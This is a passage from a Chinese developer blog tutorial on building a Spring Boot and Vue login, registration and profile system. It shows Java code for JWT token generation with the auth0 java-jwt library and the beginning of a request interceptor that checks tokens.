punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>       <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>one <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>          <span class=\"token class-name\">BeanUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">copyProperties</span><span class=\"token punctuation\">(</span>one<span class=\"token punctuation\">,</span> userDTO<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>          <span class=\"token keyword\">return</span> userDTO<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>       <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>          <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ServiceException</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Constants</span><span class=\"token punctuation\">.</span><span class=\"token constant\">CODE_600</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"用户名或密码错误\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>       <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>正常获得状态码的数据载荷预览</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120172214500.png\" alt=\"image-20240120172214500\" /></p>\n<p>这里头像显示不出来，单独在代码内加了就好了，详细原因见附录 23</p>\n<pre><code class=\"language-vue\">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;\n</code></pre>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120215036033.png\" alt=\"image-20240120215036033\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120215056217.png\" alt=\"image-20240120215056217\" /></p>\n<p>接着写前端注册页面 和 后端注册接口</p>\n<p>前端注册时需要确认密码判断，这里注意表单传参变量需要统一</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120224909973.png\" alt=\"image-20240120224909973\" /></p>\n<p>接着是个人信息页面 Peson.vue 和后端 controller 的接口实现</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120234147020.png\" alt=\"image-20240120234147020\" /></p>\n<p>数据传输格式 code，data，msg</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240120234128959.png\" alt=\"image-20240120234128959\" /></p>\n<p>不断调参改 bug 即可</p>\n<h1 id=\"springboot集成jwt\"><a class=\"anchor\" href=\"#springboot集成jwt\">#</a> Springboot 集成 JWT</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dqdGFvMTEzMC9hcnRpY2xlL2RldGFpbHMvMTExNjU4MDYw\">SpringBoot 集成 JWT 实现 token 验证_spring boot jwt token-CSDN 博客</span></p>\n<p>Jwt 全称是：json web token。它将用户信息加密到 token 里，服务器不保存任何用户信息。服务器通过使用保存的密钥验证 token 的正确性，只要正确即通过验证。</p>\n<p><strong>优点</strong></p>\n<ol>\n<li>简洁：可以通过 URL、POST 参数或者在 HTTP header 发送，因为数据量小，传输速度也很快；</li>\n<li>自包含：负载中可以包含用户所需要的信息，避免了多次查询数据库；</li>\n<li>因为 Token 是以 JSON 加密的形式保存在客户端的，所以 JWT 是跨语言的，原则上任何 web 形式都支持；</li>\n<li>不需要在服务端保存会话信息，特别适用于分布式微服务。</li>\n</ol>\n<p><strong>缺点</strong></p>\n<ol>\n<li>无法作废已颁布的令牌；</li>\n<li>不易应对数据过期。</li>\n</ol>\n<p><strong> <code>Jwt</code>  消息构成</strong></p>\n<p>一个 <code>token</code>  分 3 部分，按顺序为</p>\n<ol>\n<li>头部（ <code>header</code> )</li>\n<li>载荷（ <code>payload</code> )</li>\n<li>签证（ <code>signature</code> )</li>\n</ol>\n<p>三部分之间用 <code>.</code>  号做分隔。例如：</p>\n<pre><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiIxYzdiY2IzMS02ODFlLTRlZGYtYmU3Yy0wOTlkODAzM2VkY2UiLCJleHAiOjE1Njk3Mjc4OTF9.wweMzyB3tSQK34Jmez36MmC5xpUh15Ni3vOV_SGCzJ8\n</code></pre>\n<p><strong>项目依赖 pom.xml</strong></p>\n<figure class=\"highlight xml\"><figcaption data-lang=\"XML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>groupId</span><span class=\"token punctuation\">></span></span>com.auth0<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>groupId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>artifactId</span><span class=\"token punctuation\">></span></span>java-jwt<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>artifactId</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>version</span><span class=\"token punctuation\">></span></span>3.10.3<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>version</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>dependency</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>根据模板继承好 token 生成、验证等方法，完善 UserDTO 类的成员变量</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>utils</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">cn<span class=\"token punctuation\">.</span>hutool<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>date<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">DateUtil</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">cn<span class=\"token punctuation\">.</span>hutool<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">StrUtil</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>auth0<span class=\"token punctuation\">.</span>jwt<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">JWT</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>auth0<span class=\"token punctuation\">.</span>jwt<span class=\"token punctuation\">.</span>algorithms<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Algorithm</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>entity<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">User</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>service<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IUserService</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">jakarta<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HttpServletRequest</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">RequestContextHolder</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>context<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ServletRequestAttributes</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">PostConstruct</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Resource</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Date</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"18\"></td><td><pre> * @Author Xh1Xxhg</pre></td></tr><tr><td data-num=\"19\"></td><td><pre> * @Date 2024-01-20 23:50</pre></td></tr><tr><td data-num=\"20\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">TokenUtils</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">IUserService</span> staticUserService<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token annotation punctuation\">@Resource</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">IUserService</span> userService<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token annotation punctuation\">@PostConstruct</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">setUserService</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>       staticUserService <span class=\"token operator\">=</span> userService<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>     * 生成 token</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>     * @return</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">String</span> <span class=\"token function\">genToken</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> userId<span class=\"token punctuation\">,</span> <span class=\"token class-name\">String</span> sign<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>       <span class=\"token keyword\">return</span> <span class=\"token constant\">JWT</span><span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">withAudience</span><span class=\"token punctuation\">(</span>userId<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 将 user id 保存到 token 里面，作为载荷</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>             <span class=\"token punctuation\">.</span><span class=\"token function\">withExpiresAt</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">DateUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">offsetHour</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Date</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 2 小时后 token 过期</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>             <span class=\"token punctuation\">.</span><span class=\"token function\">sign</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Algorithm</span><span class=\"token punctuation\">.</span><span class=\"token function\">HMAC256</span><span class=\"token punctuation\">(</span>sign<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 以 password 作为 token 的密钥   //Algorithm 为加密算法</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>     * 获取当前登录的用户信息</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>     * @return user 对象</pre></td></tr><tr><td data-num=\"46\"></td><td><pre>     */</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">User</span> <span class=\"token function\">getCurrentUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>       <span class=\"token keyword\">try</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>          <span class=\"token class-name\">HttpServletRequest</span> request <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">ServletRequestAttributes</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">RequestContextHolder</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRequestAttributes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getRequest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>          <span class=\"token class-name\">String</span> token <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>          <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StrUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">isNotBlank</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>             <span class=\"token class-name\">String</span> userId <span class=\"token operator\">=</span> <span class=\"token constant\">JWT</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getAudience</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>             <span class=\"token keyword\">return</span> staticUserService<span class=\"token punctuation\">.</span><span class=\"token function\">getById</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span>userId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>          <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>       <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Exception</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>          <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>       <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>       <span class=\"token keyword\">return</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>token 成功设置</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121100450529.png\" alt=\"image-20240121100450529\" /></p>\n<p>同时前端放开 request.js ，加入 token 传参</p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121101329367.png\" alt=\"image-20240121101329367\" /></p>\n<p><img data-src=\"C:%5CUsers%5CLENOVO%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240121101128081.png\" alt=\"image-20240121101128081\" /></p>\n<p>token 生成写完，就需要写</p>\n<p>拦截器拦截 token 的类</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">package</span> <span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>common<span class=\"token punctuation\">.</span>interceptor</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">cn<span class=\"token punctuation\">.</span>hutool<span class=\"token punctuation\">.</span>core<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">StrUtil</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>auth0<span class=\"token punctuation\">.</span>jwt<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">JWT</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>auth0<span class=\"token punctuation\">.</span>jwt<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">JWTVerifier</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>auth0<span class=\"token punctuation\">.</span>jwt<span class=\"token punctuation\">.</span>algorithms<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Algorithm</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>auth0<span class=\"token punctuation\">.</span>jwt<span class=\"token punctuation\">.</span>exceptions<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">JWTDecodeException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>auth0<span class=\"token punctuation\">.</span>jwt<span class=\"token punctuation\">.</span>exceptions<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">JWTVerificationException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>common<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Constants</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>entity<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">User</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>exception<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ServiceException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">com<span class=\"token punctuation\">.</span>xoxbc<span class=\"token punctuation\">.</span>springboot<span class=\"token punctuation\">.</span>service<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IUserService</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">jakarta<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HttpServletRequest</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">jakarta<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span>http<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HttpServletResponse</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>method<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HandlerMethod</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">org<span class=\"token punctuation\">.</span>springframework<span class=\"token punctuation\">.</span>web<span class=\"token punctuation\">.</span>servlet<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HandlerInterceptor</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">javax<span class=\"token punctuation\">.</span>annotation<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Resource</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"21\"></td><td><pre> * JWT 拦截器</pre></td></tr><tr><td data-num=\"22\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">JwtInterceptor</span> <span class=\"token keyword\">implements</span> <span class=\"token class-name\">HandlerInterceptor</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token annotation punctuation\">@Resource</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token class-name\">IUserService</span> userService<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token annotation punctuation\">@Override</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">boolean</span> <span class=\"token function\">preHandle</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HttpServletRequest</span> request<span class=\"token punctuation\">,</span> <span class=\"token class-name\">HttpServletResponse</span> response<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span> handler<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token class-name\">String</span> token <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getHeader</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">StrUtil</span><span class=\"token punctuation\">.</span><span class=\"token function\">isBlank</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            token <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span><span class=\"token function\">getParameter</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token comment\">// 如果不是映射到方法直接通过</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>handler <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">HandlerMethod</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            <span class=\"token class-name\">AuthAccess</span> annotation <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">HandlerMethod</span><span class=\"token punctuation\">)</span> handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getMethodAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">AuthAccess</span><span class=\"token punctuation\">.</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 